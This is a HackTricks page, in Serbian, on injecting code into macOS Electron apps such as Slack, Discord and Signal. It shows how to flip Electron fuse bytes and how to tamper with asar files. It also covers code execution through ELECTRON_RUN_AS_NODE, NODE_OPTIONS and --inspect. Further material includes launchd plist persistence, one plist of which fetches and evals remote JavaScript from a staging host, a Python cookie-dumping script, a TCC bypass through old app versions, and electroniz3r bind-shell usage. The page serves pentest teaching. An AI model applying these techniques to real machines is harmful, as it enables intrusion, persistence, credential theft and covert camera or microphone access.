# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Ako ne znate šta je Electron, možete pronaći [**puno informacija ovde**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Ali za sada, samo znajte da Electron pokreće **node**.\
I node ima neke **parametre** i **env varijable** koje se mogu koristiti da **izvrše drugi kod** pored naznačenog fajla.

### Electron Fuses

Ove tehnike će biti razmatrane u nastavku, ali u poslednje vreme Electron je dodao nekoliko **bezbednosnih zastavica da ih spreči**. Ovo su [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) i ovo su one koje se koriste da **spreče** Electron aplikacije na macOS-u da **učitavaju proizvoljan kod**:

- **`RunAsNode`**: Ako je onemogućen, sprečava korišćenje env varijable **`ELECTRON_RUN_AS_NODE`** za injekciju koda.
- **`EnableNodeCliInspectArguments`**: Ako je onemogućen, parametri poput `--inspect`, `--inspect-brk` neće biti poštovani. Izbegavajući ovaj način za injekciju koda.
- **`EnableEmbeddedAsarIntegrityValidation`**: Ako je omogućen, učitani **`asar`** **fajl** će biti **validiran** od strane macOS-a. **Sprečavajući** na ovaj način **injekciju koda** modifikovanjem sadržaja ovog fajla.
- **`OnlyLoadAppFromAsar`**: Ako je ovo omogućeno, umesto da traži učitavanje u sledećem redosledu: **`app.asar`**, **`app`** i konačno **`default_app.asar`**. Proveravaće i koristiti samo app.asar, čime se osigurava da kada se **kombinuje** sa **`embeddedAsarIntegrityValidation`** fuzom, postaje **nemoguće** **učitati nevalidirani kod**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Ako je omogućen, proces pretraživača koristi fajl pod nazivom `browser_v8_context_snapshot.bin` za svoj V8 snapshot.

Još jedna zanimljiva fuzija koja neće sprečiti injekciju koda je:

- **EnableCookieEncryption**: Ako je omogućeno, skladište kolačića na disku je enkriptovano koristeći kriptografske ključeve na nivou OS-a.

### Checking Electron Fuses

Možete **proveriti ove zastavice** iz aplikacije sa:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifikovanje Electron Fuzija

Kao što [**dokumentacija pominje**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracija **Electron Fuzija** se podešava unutar **Electron binarnog** fajla koji sadrži negde string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

U macOS aplikacijama ovo je obično u `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Možete učitati ovu datoteku u [https://hexed.it/](https://hexed.it/) i pretražiti prethodni niz. Nakon ovog niza možete videti u ASCII brojeve "0" ili "1" koji označavaju da li je svaki osigurač onemogućen ili omogućen. Samo modifikujte heksadecimalni kod (`0x30` je `0` i `0x31` je `1`) da **modifikujete vrednosti osigurača**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Imajte na umu da ako pokušate da **prepišete** **`Electron Framework`** binarni fajl unutar aplikacije sa ovim modifikovanim bajtovima, aplikacija neće raditi.

## RCE dodavanje koda u Electron aplikacije

Mogu postojati **spoljni JS/HTML fajlovi** koje koristi Electron aplikacija, tako da napadač može ubrizgati kod u ove fajlove čija se potpisivanje neće proveravati i izvršiti proizvoljan kod u kontekstu aplikacije.

> [!CAUTION]
> Međutim, u ovom trenutku postoje 2 ograničenja:
>
> - Dozvola **`kTCCServiceSystemPolicyAppBundles`** je **potrebna** za modifikaciju aplikacije, tako da to po defaultu više nije moguće.
> - Kompajlirani **`asap`** fajl obično ima osigurače **`embeddedAsarIntegrityValidation`** `i` **`onlyLoadAppFromAsar`** `omogućene`
>
> Što ovaj put napada učini složenijim (ili nemogućim).

Imajte na umu da je moguće zaobići zahtev za **`kTCCServiceSystemPolicyAppBundles`** kopiranjem aplikacije u drugi direktorijum (kao što je **`/tmp`**), preimenovanjem foldera **`app.app/Contents`** u **`app.app/NotCon`**, **modifikovanjem** **asar** fajla sa vašim **malicioznim** kodom, preimenovanjem nazad u **`app.app/Contents`** i izvršavanjem.

Možete raspakovati kod iz asar fajla sa:
```bash
npx asar extract app.asar app-decomp
```
I da ga ponovo spakujete nakon što ga izmenite sa:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE sa `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Prema [**dokumentaciji**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), ako je ova env promenljiva postavljena, pokrenuće proces kao normalan Node.js proces.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Ako je osigurač **`RunAsNode`** onemogućen, env varijabla **`ELECTRON_RUN_AS_NODE`** će biti ignorisana, i ovo neće raditi.

### Injekcija iz App Plist

Kao [**predloženo ovde**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), mogli biste zloupotrebiti ovu env varijablu u plist-u da održite postojanost:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE sa `NODE_OPTIONS`

Možete sačuvati payload u drugoj datoteci i izvršiti ga:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Ako je osigurač **`EnableNodeOptionsEnvironmentVariable`** **onemogućen**, aplikacija će **zanemariti** env var **NODE_OPTIONS** kada se pokrene, osim ako env varijabla **`ELECTRON_RUN_AS_NODE`** nije postavljena, koja će takođe biti **zanemarena** ako je osigurač **`RunAsNode`** onemogućen.
>
> Ako ne postavite **`ELECTRON_RUN_AS_NODE`**, naići ćete na **grešku**: `Većina NODE_OPTIONs nije podržana u pakovanim aplikacijama. Pogledajte dokumentaciju za više detalja.`

### Injekcija iz App Plist

Možete zloupotrebiti ovu env varijablu u plist-u da održite postojanost dodavanjem ovih ključeva:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE sa inspekcijom

Prema [**ovome**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ako izvršite Electron aplikaciju sa flagovima kao što su **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, **debug port će biti otvoren** tako da se možete povezati na njega (na primer iz Chrome-a u `chrome://inspect`) i moći ćete da **injektujete kod na njega** ili čak pokrenete nove procese.\
Na primer:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Ako je osigurač **`EnableNodeCliInspectArguments`** onemogućen, aplikacija će **zanemariti node parametre** (kao što je `--inspect`) prilikom pokretanja osim ako nije postavljena env varijabla **`ELECTRON_RUN_AS_NODE`**, koja će takođe biti **zanemarena** ako je osigurač **`RunAsNode`** onemogućen.
>
> Međutim, još uvek možete koristiti **electron param `--remote-debugging-port=9229`** ali prethodni payload neće raditi za izvršavanje drugih procesa.

Korišćenjem parametra **`--remote-debugging-port=9222`** moguće je ukrasti neke informacije iz Electron aplikacije kao što su **istorija** (sa GET komandama) ili **kolačići** pretraživača (pošto su **dekriptovani** unutar pretraživača i postoji **json endpoint** koji će ih dati).

Možete naučiti kako to da uradite [**ovde**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**ovde**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) i koristiti automatski alat [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ili jednostavan skript kao:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
U [**ovom blogu**](https://hackerone.com/reports/1274695), ovo debagovanje se zloupotrebljava da se headless chrome **preuzme proizvoljne datoteke na proizvoljne lokacije**.

### Injekcija iz App Plist

Možete zloupotrebiti ovu env promenljivu u plist-u da održite postojanost dodajući ove ključeve:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

> [!TIP]
> TCC daemon iz macOS-a ne proverava izvršenu verziju aplikacije. Dakle, ako **ne možete da injektujete kod u Electron aplikaciju** sa bilo kojom od prethodnih tehnika, možete preuzeti prethodnu verziju APP-a i injektovati kod u nju jer će i dalje dobiti TCC privilegije (osim ako Trust Cache to ne spreči).

## Run non JS Code

Prethodne tehnike će vam omogućiti da pokrenete **JS kod unutar procesa Electron aplikacije**. Međutim, zapamtite da **dečiji procesi rade pod istim sandbox profilom** kao roditeljska aplikacija i **nasleđuju njihove TCC dozvole**.\
Stoga, ako želite da zloupotrebite prava za pristup kameri ili mikrofonu, na primer, možete jednostavno **pokrenuti drugi binarni fajl iz procesa**.

## Automatic Injection

Alat [**electroniz3r**](https://github.com/r3ggi/electroniz3r) se može lako koristiti za **pronalazak ranjivih Electron aplikacija** koje su instalirane i injektovanje koda u njih. Ovaj alat će pokušati da koristi tehniku **`--inspect`**:

Morate ga sami kompajlirati i možete ga koristiti ovako:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Reference

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
